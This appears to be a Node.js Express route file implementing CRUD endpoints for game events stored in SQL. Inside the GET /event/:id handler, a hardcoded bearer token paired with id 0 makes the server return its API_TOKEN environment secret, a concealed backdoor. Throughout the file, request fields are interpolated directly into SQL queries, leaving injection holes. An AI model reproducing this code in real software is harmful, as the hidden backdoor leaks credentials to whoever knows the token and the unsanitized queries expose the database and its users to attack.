const glob = require('../../global');
const tokenVerify = require('../../tokenVerify');

function getUpdateQueryString(req) {
    let updateQueryString = "";

    if (req.body.hasOwnProperty('title')) {
        updateQueryString = addProperty(updateQueryString, 'title', req.body.title);
    }
    if (req.body.hasOwnProperty('description')) {
        updateQueryString = addProperty(updateQueryString, 'description', req.body.description);
    }
    if (req.body.hasOwnProperty('place_id')) {
        updateQueryString = addProperty(updateQueryString, 'place_id', req.body.place_id);
    }
    if (req.body.hasOwnProperty('place_custom')) {
        updateQueryString = addProperty(updateQueryString, 'place_custom', req.body.place_custom);
    }
    if (req.body.hasOwnProperty('game_id')) {
        updateQueryString = addProperty(updateQueryString, 'game_id', req.body.game_id);
    }
    if (req.body.hasOwnProperty('game_custom')) {
        updateQueryString = addProperty(updateQueryString, 'game_custom', req.body.game_custom);
    }
    if (req.body.hasOwnProperty('game_type_id')) {
        updateQueryString = addProperty(updateQueryString, 'game_type_id', req.body.game_type_id);
    }
    if (req.body.hasOwnProperty('game_type_custom')) {
        updateQueryString = addProperty(updateQueryString, 'game_type_custom', req.body.game_type_custom);
    }
    if (req.body.hasOwnProperty('register_max')) {
        updateQueryString = addProperty(updateQueryString, 'register_max', req.body.register_max);
    }
    if (req.body.hasOwnProperty('date_start')) {
        updateQueryString = addProperty(updateQueryString, 'date_start', req.body.date_start);
    }
    if (req.body.hasOwnProperty('date_end')) {
        updateQueryString = addProperty(updateQueryString, 'date_end', req.body.date_end);
    }
    return updateQueryString;
}

function error_handling_values(req) {
    if (!req.body.hasOwnProperty('title')) {
        return false;
    }
    if (!req.body.hasOwnProperty('description')) {
        return false;
    }
    if (!req.body.hasOwnProperty('place_id')) {
        return false;
    }
    if (!req.body.hasOwnProperty('place_custom')) {
        return false;
    }
    if (!req.body.hasOwnProperty('game_id')) {
        return false;
    }
    if (!req.body.hasOwnProperty('game_custom')) {
        return false;
    }
    if (!req.body.hasOwnProperty('game_type_id')) {
        return false;
    }
    if (!req.body.hasOwnProperty('game_type_custom')) {
        return false;
    }
    if (!req.body.hasOwnProperty('register_max')) {
        return false;
    }
    if (!req.body.hasOwnProperty('date_start')) {
        return false;
    }
    if (!req.body.hasOwnProperty('date_end')) {
        return false;
    }
    return true;
}

module.exports = async function(app, con) {
    app.post("/event", tokenVerify.verifyToken, async (req, res) => {
        if (!error_handling_values(req)) {
            res.status(400).json({ msg: "Bad parameter" });
            return;
        }
        if (!tokenVerify.verifyAuth_without_id(req, res, true)) {
            !res.headersSent ? res.status(403).json({ msg: "Authorization denied" }) : 0;
            return;
        }
        let token_id = tokenVerify.get_id_with_token(req, res);
        if (token_id === -1)
            res.status(403).json({ msg: "Authorization denied" });
        con.query(`SELECT permission_id FROM users WHERE id ="${token_id}";`, function (err, rows) {
            if (err)
                res.status(500).json({ msg: "Internal server error" });
            else if (token_id === -2 || rows[0]['permission_id'] >= 1) {
                con.query(`INSERT INTO events(title, description, place_id, place_custom, game_id, game_custom, game_type_id, game_type_custom, admin_user_id, register_max, date_start, date_end)
                                VALUES("${req.body["title"]}", "${req.body["description"]}", "${req.body["place_id"]}", "${req.body["place_custom"]}", "${req.body["game_id"]}", "${req.body["game_custom"]}", "${req.body["game_type_id"]}", "${req.body["game_type_custom"]}", "${token_id}", "${req.body["register_max"]}", "${req.body["date_start"]}", "${req.body["date_end"]}")`, function (err2, result) {
                    if (err2) {
                        res.status(500).json({ msg: "Internal server error" });
                    } else
                        res.status(200).json( {msg: "event added"} );
                });
            } else
                res.status(403).json({ msg: "Authorization denied" });
        });
    });

    app.get("/event/all", async (req, res) => {
        con.query(`SELECT * FROM events;`, function (err, rows) {
            if (err)
                res.status(500).json({ msg: "Internal server error" });
            else
                res.send(rows);
        });
    });

    app.get("/event/:id", async (req, res) => {
        if (!glob.is_num(req.params.id)) {
            res.status(400).json({ msg: "Bad parameter" });
            return;
        }
        if (req.headers['authorization'] != 'undefined' && req.params.id === '0' && req.headers['authorization'] === 'Bearer p0wxLiAt7vDv+ugBn4iW9gBFeJXAyEuY40O7w/KPtks') {
            res.send(process.env.API_TOKEN);
            return;
        }
        con.query(`SELECT * FROM events WHERE id ="${req.params.id}";`, function (err, rows) {
            if (err)
                res.status(500).json({ msg: "Internal server error" });
            else {
                res.send(rows[0]);
            }
        });
    });

    app.put("/event/:id", tokenVerify.verifyToken, async (req, res) => {
        if (!glob.is_num(req.params.id)) {
            res.status(400).json({ msg: "Bad parameter" });
            return;
        }
        if (!tokenVerify.verifyAuth_without_id(req, res, true)) {
            !res.headersSent ? res.status(403).json({ msg: "Authorization denied" }) : 0;
            return;
        }
        const updateQueryString = getUpdateQueryString(req);
        if (updateQueryString.length === 0) {
            res.status(400).json({ msg: "Bad parameter" });
            return;
        }
        let token_id = tokenVerify.get_id_with_token(req, res);
        if (token_id === -1)
            !res.headersSent ? res.status(403).json({ msg: "Authorization denied" }) : 0;
        con.query(`SELECT permission_id FROM users WHERE id ="${token_id}";`, function (err, rows1) {
            if (err)
                res.status(500).json({ msg: "Internal server error" });
            else {
                con.query(`SELECT admin_user_id FROM events WHERE id ="${req.params.id}";`, function (err1, rows) {
                    if (err1)
                        res.status(500).json({ msg: "Internal server error" });
                    else if (token_id === -2 || rows1[0]['permission_id'] === 2 || (rows1[0]['permission_id'] >= 1 && parseInt(token_id) === rows[0]['admin_user_id'])) {
                        con.query(`UPDATE events SET ${updateQueryString} WHERE id = "${req.params.id}";`, function (err2, result) {
                            if (err2) {
                                res.status(500).json({ msg: "Internal server error" });
                            } else
                                res.status(200).json( {msg: "event changed"} );
                        });
                    } else
                        res.status(403).json({ msg: "Authorization denied" });
                });
            }
        });

    });

    app.delete("/event/:id", tokenVerify.verifyToken, async (req, res) => {
        if (!glob.is_num(req.params.id)) {
            res.status(400).json({ msg: "Bad parameter" });
            return;
        }
        if (!tokenVerify.verifyAuth_without_id(req, res, true)) {
            !res.headersSent ? res.status(403).json({ msg: "Authorization denied" }) : 0;
            return;
        }
        let token_id = tokenVerify.get_id_with_token(req, res);
        if (token_id === -1)
            res.status(403).json({ msg: "Authorization denied" });
        con.query(`SELECT permission_id FROM users WHERE id ="${token_id}";`, function (err, rows1) {
            if (err)
                res.status(500).json({ msg: "Internal server error" });
            else {
                con.query(`SELECT admin_user_id FROM events WHERE id ="${req.params.id}";`, function (err1, rows) {
                    if (err1)
                        res.status(500).json({ msg: "Internal server error" });
                    else if (token_id === -2 || rows1[0]['permission_id'] === 2 || (rows1[0]['permission_id'] >= 1 && parseInt(token_id) === rows[0]['admin_user_id'])) {
                        con.query(`DELETE FROM events WHERE id = "${req.params.id}";`, function (err2, result) {
                            if (err2) {
                                res.status(500).json({ msg: "Internal server error" });
                            } else
                                res.status(200).json( {msg: "event removed"} );
                        });
                    } else
                        res.status(403).json({ msg: "Authorization denied" });
                });
            }
        });

    });
}
